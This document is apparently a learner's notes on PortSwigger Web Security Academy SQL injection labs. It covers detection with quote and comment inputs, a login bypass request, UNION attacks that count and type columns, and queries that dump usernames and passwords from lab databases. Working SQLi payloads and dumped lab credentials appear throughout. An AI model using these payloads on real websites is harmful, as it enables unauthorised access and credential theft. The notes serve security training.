https://www.youtube.com/watch?v=wX6tszfgYp4

https://portswigger.net/web-security/sql-injection
To test if sqli exists or not
1) use  ( ' ) as input and if it shows some error   , then
2) use ( '-- ) if it shows  200 ok response that means SQLi is present
because at ( ' ) the sql shows error due to syntax error, but at ( '-- ) the -- comments out the rest of the sql query being executed hence request dont show error.


# 1)Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data                                  video:https://portswigger.net/web-security/sql-injection/
 lab video: https://www.youtube.com/watch?v=X1X1UdaC_90

notes:
SQLi Product category filter (https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data) 


Query structure : SELECT * FROM products WHER
E category = 'Gifts' AND released = 1

end goal: display all products regardless of category both released and unreleased.
application by default do show unreleased product to user but sqli does it.

Analysis:

https://0a6c008403c5a91d8394f18000c4007b.web-security-academy.net/filter?category=Corporate+gifts for the url 
the query is  
SELECT * FROM products WHERE category = 'Corporate+gifts' AND released = 1

when we put ( ' ) to test the sqli   
https://0a6c008403c5a91d8394f18000c4007b.web-security-academy.net/filter?category='
for the url 
the query is  
SELECT * FROM products WHERE category = ''' AND released = 1

and it shows internal server error 


SELECT * FROM products WHERE category = ' '-- ' AND released = 1
then use  '-- , now it shows empty means the query executed hence sqli present


SELECT * FROM products WHERE category = ' '  or 1=1 -- ' AND released = 1
then use **'  or 1=1 --**  now it shows all product  means the query executed hence sqli exploited.




# 2)Lab: SQL injection vulnerability allowing login bypass
Link: https://portswigger.net/web-security/sql-injection/lab-login-bypass


request sent for exploiting the sqli:
`POST /login HTTP/2`
`Host: 0aa7008f03eaa71f85d6a4ef008900df.web-security-academy.net`
`Cookie: session=QE7wOVq0qOUdFqMPKnt2jdgFzMOR1RFC`
`User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0`
`Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8`
`Accept-Language: en-US,en;q=0.5`
`Accept-Encoding: gzip, deflate, br`
`Content-Type: application/x-www-form-urlencoded`
`Content-Length: 81`
`Origin: https://0aa7008f03eaa71f85d6a4ef008900df.web-security-academy.net`
`Referer: https://0aa7008f03eaa71f85d6a4ef008900df.web-security-academy.net/login`
`Upgrade-Insecure-Requests: 1`
`Sec-Fetch-Dest: document`
`Sec-Fetch-Mode: navigate`
`Sec-Fetch-Site: same-origin`
`Sec-Fetch-User: ?1`
`Priority: u=0, i`
`Te: trailers`

`csrf=8ePpuDgiMTtIpvIa5QFCXEvVy8eY4ZZb&username=administrator%27--&password=%27%27`


The above request have the below url structure and Query structure
https://0a9000f803024633818f758c0079008f.web-security-academy.net/my-account?id=administrator

SELECT firstname FROM products WHERE username= 'administrator'--' and password=' '




# 3)Retrieving data from other database tables i.e [https://portswigger.net/web-security/sql-injection/union-attacks]


**SQL injection UNION attacks** :
https://portswigger.net/web-security/sql-injection/union-attacks


# 4)Lab: SQL injection UNION attack, determining the number of columns returned by the query(https://portswigger.net/web-security/sql-injection/union-attacks)
(https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

solution video: https://www.youtube.com/watch?v=umXGHbEyW5I

Explaination of video:

SQLi - Product category filter

End Goal: determine the number of columns returned by the query. 

Background (Union):

table1      table2
a | b       c | d 
-----       -----
1 , 2       2 , 3
3 , 4       4 , 5



Query #1: select a, b from table1
1,2
3,4

Query #2: select a, b from table1 UNION select c,d from table2
1,2
3,4
2,3
4,5




Rule: 
- The number and the order of the columns must be the same in all queries
- The data types must be compatible

**Step #1: Determine # of columns**

SQLi attack (way #1):  Union operator SQL(Microsoft):
https://learn.microsoft.com/en-us/sql/t-sql/language-elements/set-operators-union-transact-sql?view=sql-server-ver16

select ? from table1 UNION select NULL
-error -> incorrect number of columns

select ? from table1 UNION select NULL, NULL, NULL
-200 response code -> correct number of columns


SQLi attack (way #2):  Order by operator SQL(Microsoft):
https://learn.microsoft.com/en-us/sql/t-sql/queries/select-order-by-clause-transact-sql?view=sql-server-ver16

select a, b from table1 order by 3 (using this we can determin no.of columns using in the sql query)


```

 ####  Solution

1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Modify the `category` parameter, giving it the value `'+UNION+SELECT+NULL--`. Observe that an error occurs.
3. Modify the `category` parameter to add an additional column containing a null value:
    
    `'+UNION+SELECT+NULL,NULL--`
4. Continue adding null values until the error disappears and the response includes additional content containing the null values.
```


Query used to solve this lab was:
```
https://0aed007503ed3a1fa9f7494e002b00e3.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+NULL,NULL,NULL-- 

```




# 5)Lab: SQL injection UNION attack, finding a column containing text(https://portswigger.net/web-security/sql-injection/union-attacks)

Lab video: https://www.youtube.com/watch?v=SGBTC5D7DTs1

**Step #2: Determine the data type of the columns**

select a, b, c from table1 UNION select NULL, NULL, 'a'    ( '+UNION+SELECT+NULL,NULL,'a'--)
-> error -> column is not type text
-> no error -> column is of type text

```
Analysis:

' order by 1--
-> 3 columns -> 1st column is not shown on the page.

' UNION select NULL, 'KsZXy4', NULL--
-> 2nd column of type string

' UNION select 'a', NULL, NULL--'
' UNION select NULL, 'a', NULL--
```



```
requried to get this string from DB: '3TcZLM'

Query used to solve the lab:
'+UNION+SELECT+NULL,'3TcZLM',NULL--
```



# 6)Lab: SQL injection UNION attack, retrieving data from other tables(https://portswigger.net/web-security/sql-injection/union-attacks)

Lab video: https://www.youtube.com/watch?v=6Dsj5SqR944


SQL Injection - Product category filter.

End Goal - Output the usernames and passwords in the users table and login as the administrator user.

Analysis:
--------

1) Determine # of columns that the vulnerable query is using
' order by 1--
' order by 2--
' order by 3-- -> internal server error

3-1 = 2


2) Determine the data type of the columns

select a, b from products where category='Gifts

' UNION select 'a', NULL--
' UNION select 'a', 'a'--
-> both columns are of data type string

' UNION select username, password from users--

administrator
tqx26ugf8jp1g30atsu9


# 7)Lab: SQL injection UNION attack, retrieving multiple values in a single column(https://portswigger.net/web-security/sql-injection/union-attacks)
Lab video: https://www.youtube.com/watch?v=yRVYoqR9vrI

SQL Injection - Product category filter

End Goal: retrieve all usernames and passwords and login as the administrator user.

Analysis:
--------

(1) Find the number of columns that the vulnerable is using:
' order by 1-- -> not displayed on the page
' order by 2-- -> displayed on the page
' order by 3-- -> internal server error

3 - 1 = 2

(2) Find which columns contain text
' UNION SELECT 'a', NULL--
' UNION SELECT NULL, 'a'-- ->**

(3) Output data from other tables

' UNION select NULL, username from users--
' UNION select NULL, password from users--

' UNION select NULL, version()--
-> PostgreSQL 11.11 (Debian 11.11-1.pgdg90+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516, 64-bit

' UNION select NULL, username || '*' || password from users--

carlos*hx8lpsrznosr462ydnvh
administrator*35v95vbpktdv4c2nqgak
wiener*0qc4vtnx4o08sr5nsstf

script.py <url> 
